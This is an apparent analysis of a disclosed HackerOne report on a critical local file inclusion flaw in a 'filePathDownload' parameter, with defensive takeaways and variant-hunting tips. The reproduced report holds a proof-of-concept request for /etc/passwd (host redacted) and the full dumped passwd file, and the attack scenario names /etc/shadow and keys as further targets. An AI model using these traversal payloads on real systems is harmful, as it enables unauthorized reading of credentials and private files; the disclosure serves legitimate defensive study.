# Local File Inclusion (LFI) in filePathDownload Parameter

## Metadata
- **Source:** HackerOne
- **Report:** 1542734 | https://hackerone.com/reports/1542734
- **Submitted:** 2022-04-16
- **Reporter:** exploitmsf
- **Program:** Unknown (Redacted)
- **Bounty:** Unknown
- **Severity:** Critical
- **Vuln:** Local File Inclusion (LFI), Path Traversal, Arbitrary File Read
- **CVEs:** None
- **Category:** uncategorised

## Summary
A critical Local File Inclusion vulnerability exists in the filePathDownload parameter that allows unauthenticated attackers to read arbitrary files from the server filesystem. The vulnerability was demonstrated by successfully reading /etc/passwd, exposing system user credentials and configuration.

## Attack scenario
1. Attacker identifies the vulnerable filePathDownload endpoint accepting user input
2. Attacker constructs a request with path traversal payload (e.g., /etc/passwd) in the parameter
3. Application fails to sanitize or validate the file path parameter
4. Server processes the request without proper access controls or path restrictions
5. Attacker receives sensitive file contents in the HTTP response
6. Attacker can iterate through various system files (/etc/shadow, application configs, source code, keys) to extract confidential data

## Root cause
Insufficient input validation and lack of path canonicalization on the filePathDownload parameter. The application likely directly uses user-supplied input to construct file paths without sanitizing special characters (../, ..\) or validating against an allowlist of permitted directories.

## Attacker mindset
An attacker with basic web security knowledge can exploit this vulnerability without authentication. The simplicity of the PoC demonstrates the lack of basic security controls. The attacker's goal would be reconnaissance and information gathering to support further attacks (credential harvesting, config discovery, finding hardcoded secrets).

## Defensive takeaways
- Implement strict input validation: reject path traversal sequences (../, .., null bytes)
- Use allowlist-based path validation restricting downloads to specific directories only
- Canonicalize file paths and verify they resolve within intended directory using realpath()
- Implement proper access controls and authentication for file download functionality
- Use secure file serving mechanisms that don't expose direct filesystem paths
- Apply principle of least privilege: run application with minimal required file permissions
- Implement comprehensive logging and alerting for suspicious file access patterns
- Conduct security code review of all file handling operations
- Perform regular penetration testing focusing on file inclusion vectors

## Variant hunting
Search for similar patterns: other parameters accepting file paths (filePath, path, file, download, export, report), endpoints using include/require statements with user input, directory traversal in archived file extraction, XXE attacks combined with file disclosure, SSRF to access local files

## MITRE ATT&CK
- T1190
- T1083
- T1552

## Notes
The writeup lacks detail on remediation steps and mitigation recommendations. The redacted nature of the submission obscures the affected vendor/product. The raw /etc/passwd disclosure is concerning as it reveals system users including service accounts (apache, drupal, splunk, cwagent, ssm-user) suggesting this is a production AWS/cloud infrastructure. No evidence of authentication bypass or chaining with other vulnerabilities is shown, but the simplicity of exploitation increases risk.

## Full report
<details><summary>Expand</summary>

hi i found critcal lfi vulnerability 
poc: https://█████████/████████=/etc/passwd
response: 
```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
chrony:x:998:995::/var/lib/chrony:/sbin/nologin
ec2-user:x:1000:1000:Cloud User:/home/ec2-user:/bin/bash
saslauth:x:996:76:Saslauthd user:/run/saslauthd:/sbin/nologin
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
sssd:x:995:993:User for sssd:/:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
sustainment:x:1001:1001::/home/sustainment:/bin/bash
emerg:x:1002:1002:Sustainment Linux Emergency Acct:/home/emerg:/bin/bash
cwagent:x:993:992::/home/cwagent:/bin/bash
ssm-user:x:1003:1004::/home/ssm-user:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
drupal:x:1004:1005::/home/drupal:/bin/bash
splunk:x:1005:1006:Splunk Server:/opt/splunkforwarder:/bin/bash
mfe:x:992:1007::/home/mfe:/sbin/nologin
```

## Impact

attacker can read any file in system

## System Host(s)
█████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
all poc in Description

## Suggested Mitigation/Remediation Actions




</details>

---
*Analysed by Claude on 2026-05-24*
